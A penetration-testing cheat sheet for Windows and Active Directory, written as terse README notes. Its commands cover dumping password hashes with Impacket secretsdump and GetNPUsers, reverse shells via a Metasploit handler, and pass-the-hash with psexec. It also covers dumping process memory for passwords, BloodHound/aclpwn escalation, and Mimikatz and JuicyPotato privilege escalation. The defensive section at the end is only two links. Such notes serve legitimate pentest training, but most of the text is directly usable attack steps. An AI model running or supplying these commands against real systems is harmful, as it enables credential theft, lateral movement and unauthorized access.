# WINDOWS Pen Testing scripts and tutorials

## Recon

Enum4Linux will get you Domains, Workgroups, Usernames, etc.
```bash
enum4linux -a [-u USER -p PASS] IP
```

Impackets lookupsid will give you also the users if enum4linux may not work properly

```bash
lookupsid.py IP
```

## Get User Password Hashes

Impackets GetNPUsers tries several attacks to retrieve password hashes

```bash
GetNPUsers.py IP
```

Further on Impackets secretdump can retrieve secret password hashes which only privileged accounts can retrieve, or due to a misconfiguration.
```bash
secretdump.py DOMAIN/USER:PWD@IP 
```


## WinRM 

### File transfer

For the winrm service use winrm/wirnmcp.rb to upload and download files

```bash
ruby winrm/winrmcp.rb IP USER PASSWORD -u LOCAL_FILES+ REMOTE_FOLDER
```

```bash
ruby ./winrm/winrm.rb IP USER PASSWORD -d REMOTE_FILES+ LOCAL_FOLDER
```

### Shell

use evil-winrm for a shell. 

If something wont work execute 

```bash
bash ./msf/create-reverse-shell.sh LOCAL_IP LOCAL_PORT 
```

and execute it on the remote server

while having the following session open at metasploit

```msf
msfconsole

use exploit/multi/handler
set LPORT LOCAL_PORT
set LHOST LOCAL_IP
exploit -j -z 
```

if the meterpreter session is opened in the msfconsole:

```
sessions -i 0
```

to get to the first created session


## SAMBA

```bash
smbclient -L //IP/ 
```

just hit enter for anonymous access. 
You could also try to access it anonymously with

```bash
smbclient //IP/SHARE 
```

Sometimes you can access the SYSVOL share, if it is not cleaned up it may contain some xml files in the Policy folder which contains password hashes


## Kerberos

Checkout Impacket scripts

if you have access rights on the machine you also can use mimikatz. 
Upload it and try it out. 


## BloodHound & aclpwn

Using BloodHound you can generate a path from owned principals to admin domains if an LDAP server is running

1. Upload SharpHound.ps1
2. Exec PS `C:\..\ Import-Module .\SharpHound.ps1`
3. Exec PS `C:\..\ Invoke-BloodHound -CollectionMethod All -DomainController DC -LdapUser USER -LdapPass PASSWORD -IgnoreLdapCert`
4. Download XYZ-BloodHound.zip
5. start neo4j `neo4j console &`
6. start BH `bloodhound`
7. upload zip file
8. use aclpwn `aclpwn -f USER -ft User -t ADMIN_DOMAIN -d DOMAIN -du neo4j -dp neo4jpass -s IP -u USER -p PASSWORD`
9. if successfull you can now use Impackets secretdump.py 'secretsdump.py DOMAIN/USER:PASSWORD@IP'
9.1 or use mimikatz 


## Dump Processes

Get ProcDump https://docs.microsoft.com/en-us/sysinternals/downloads/procdump and upload it to the windows server.
Afterwards you can dump any process by using

```bash
.\procdump64.exe -ma PID DUMP_FILE
```

Download it and analyze it. If Firefox is running, it might be possible that passwods are send plain text. 

## Shells

Next to evil-winrm, meterpreter shells and reverse shells you can get access using impackets psexec.py 

```bash
psexec.py DOMAIN/USER:PASSWORD@IP 
```

or if you cannot crack the NTLM Hash you can access directly using the hash with the pass the hash method (https://en.wikipedia.org/wiki/Pass_the_hash)

```bash
psexec.py -hashes LMHASH:NTHASH DOMAIN/USER@IP
```

## Privilege Escalation

## JuicyPotato 

Use JuicyPotato if you have a service account 

check priveleges in a powershell command with

```
whoami /priv
```

if Impersonate or WithToken is enabled. escalate

### WinPEAS

Use WinPEAS for enumeration

### Using AlwaysInstalledElevated misconfig

https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/

### Mimikatz
Mimikatz has several options, from exploiting kerberos over pass the hash.
Look at https://github.com/gentilkiwi/mimikatz/wiki

### BloodHound and aclpwn 
see above

### Enumeration (not windows specific)

#### Dump Processes
see above

#### MITM
Getting a local mitm using a proxy for example, we can read traffic and ideally getting passwords in clear. 
Use own adjusted scripts depending on the software. 

#### enumerate whats on a machine
see https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ for several PS commands to check the server for services, files etc.

#### CVEs 
Check for old CVEs with Sherlocks PowerShell script
upload Sherlock.ps1 to the server

```bash
Import-Module .\Sherlock.ps1
```

or use the newer version Watson.
upload the Watson_Net45.exe or Watson_Net35.exe to the server and execute

```bash 
.\Watson_Net45.exe 
```

# Blue Team

 https://redcanary.com/blog/investigating-powershell-attacks/ 
 
 ViperMonkey for vba analazing
